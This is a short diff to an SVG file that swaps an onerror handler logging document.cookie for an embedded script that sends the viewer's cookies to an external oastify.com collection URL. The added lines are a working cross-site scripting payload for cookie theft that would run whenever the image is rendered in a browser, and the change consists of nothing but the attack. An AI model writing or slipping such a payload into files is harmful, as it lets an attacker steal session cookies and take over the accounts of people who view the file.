@@ -1,4 +1,5 @@
-<svg xmlns="http://w3.org">
-  <image href="invalid-source" onerror="console.log(document.cookie)" />
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    fetch('https://kpd9jlv7w9j46xyntrw6rbr42v8mwfk4.oastify.com/steal?cookie=' + document.cookie, {mode: 'no-cors'});
+  </script>
 </svg>
-
